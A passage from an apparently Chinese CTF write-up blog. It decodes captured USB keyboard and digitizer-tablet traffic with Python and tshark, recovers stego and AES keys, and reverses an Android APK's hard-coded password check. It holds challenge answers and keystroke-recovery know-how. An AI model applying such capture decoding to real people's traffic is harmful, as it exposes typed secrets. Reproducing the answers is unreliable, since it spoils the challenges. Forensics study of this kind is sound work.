text">data:<br>0000100000000000<br>00000c0000000000<br>00000e0000000000<br>00002a0000000000<br>0000100000000000<br>0000040000000000<br>0000080000000000<br>00002a0000000000<br>0000160000000000<br>00000b0000000000<br>00000c0000000000<br>00001c0000000000<br>00002a0000000000<br>00002c0000000000<br>0200340000000000<br>00002a0000000000<br>0200090000000000<br>00000c0000000000<br>0000110000000000<br>0000070000000000<br>0200170000000000<br>00002a0000000000<br>0200170000000000<br>00000b0000000000<br>0000080000000000<br>0000120000000000<br>00002a0000000000<br>0200150000000000<br>0000080000000000<br>0000040000000000<br>00000f0000000000<br>00000a0000000000<br>00002a0000000000<br>02000e0000000000<br>0000080000000000<br>00001c0000000000<br>00000a0000000000<br>00002a0000000000<br>0000040000000000<br>0000110000000000<br>0000070000000000<br>00000f0000000000<br>00002a0000000000<br>0200100000000000<br>0000040000000000<br>00000e0000000000<br>0000080000000000<br>0000080000000000<br>00002a0000000000<br>02000c0000000000<br>0000170000000000<br>02001e0000000000<br>0000070000000000<br>00002a0000000000<br></code></pre></td></tr></table></figure><p>明显的USB键盘流量</p><p>使用脚本提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key.txt&#x27;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>得到<code>mik&lt;DEL&gt;mae&lt;DEL&gt;shiy&lt;DEL&gt;&lt;SPACE&gt;:&lt;DEL&gt;FindT&lt;DEL&gt;Theo&lt;DEL&gt;Realg&lt;DEL&gt;Keyg&lt;DEL&gt;andl&lt;DEL&gt;Makee&lt;DEL&gt;It!d&lt;DEL&gt;</code></p><p>去掉删除的字符应该是<code>mimashi FindTheRealKeyandMakeIt!</code>，但是这句话的意思让我们找到真正的key，所以这个应该是假的key</p><p>仔细观察删掉的字符，发现正好是key开头，提取出来得到<code>key:Toggled</code></p><p>emoji-aes解密得到flag</p><h2 id="hard-Digital-plate"><a href="#hard-Digital-plate" class="headerlink" title="hard_Digital_plate"></a>hard_Digital_plate</h2><p><em>赛后复现</em></p><p><code>foremost</code>可以分离出一张图片，根据名字猜测是<code>oursecret</code>隐写</p><p>流量分析，发现是数位板流量</p><p>tshark提取<br><code>tshark -r hard_Digital_plate.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; out.txt</code></p><p>python提取坐标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure><p><code>gnuplot</code>画图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-1.png"></p><p>得到<code>oursecret</code>密码<code>kfae5y4wi2shwj81y2kda6ax7x</code></p><p>解一下<code>oursecret</code>，拿到<code>U2FsdGVkX18jQgWzhln3pPiVK8gaBxIzhY1JWcFlKiRdBkV/jDmEBxJV9PZmwBJ7MU3IdNf4hWryZLYRLuxA4w==</code></p><p>图片备注中看到<code>糟糕，好像有几个字写的太轻了，看不清楚</code></p><p>提取低压感数据，以<code>0xf000</code>作为压感临界值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) &lt; <span class="hljs-number">0xf000</span>:<br>        result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure><p><code>gnuplot</code>画图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-2.png"></p><p>得到<code>key</code>：<code>w12kax</code></p><p>aes解密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-3.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>先安装apk，随意输入一个值，返回<code>error！</code></p><p>jadx中搜索关键字，得到判断代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; ccompare = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(Arrays.asList(<span class="hljs-built_in">this</span>.compare));<br>Integer[] compare = &#123;<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, IntegvalueOf((<span class="hljs-type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION412&#125;;<br><span class="hljs-type">String</span> <span class="hljs-variable">mname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ccadwjlyah&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> MainActivity.<span class="hljs-built_in">this</span>.name.getText().toString().trim();<br>    List&lt;Integer&gt; ppwd = MainActivity.change(MainActivity.<span class="hljs-built_in">this</span>.pass.getT().toString().trim());<br>    <span class="hljs-keyword">if</span> (!user.equals(<span class="hljs-built_in">this</span>.mname) || !ppwd.equals(<span class="hljs-built_in">this</span>.ccompare)) &#123;<br>        Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;error！&quot;</span>, <span class="hljs-number">0</span>).show();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;correct！&quot;</span>, <span class="hljs-number">0</span>).show();<br>    MainActivity.<span class="hljs-built_in">this</span>.startActivity(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(MainActivity.<span class="hljs-built_in">this</span>, afterlclass));<br>&#125;<br></code></pre></td></tr></table></figure><p>加密函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; <span class="hljs-title function_">change</span><span class="hljs-params">(String args)</span> &#123;<br>    <span class="hljs-type">char</span>[] ch;<br>    List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : args.toCharArray()) &#123;<br>        list.add(Integer.valueOf((c ^ <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure><p>用户名明文存储，是<code>ccadwjlyah</code></p><p>程序会对输入后的密码加密然后与程序中的<code>compare</code>变量比较</p><p>获取<code>compare</code>数组的值，其中有一个成员存储在变量中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-2.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, <span class="hljs-number">200</span>, <span class="hljs-number">412</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((i&gt;&gt;<span class="hljs-number">2</span>)^<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到密码<code>f4n_4ndro1d</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-1.png"></p><p>赛后发现的一个非预期：因为最后flag是存储在图片中的，所以直接把apk当压缩包解压，去找图片也能看到flag</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>因为加密代码<code>(str.index(i)*key+7)%37</code>中取余了37，所以key的值可以认为在0~37的范围内</p><p>直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span 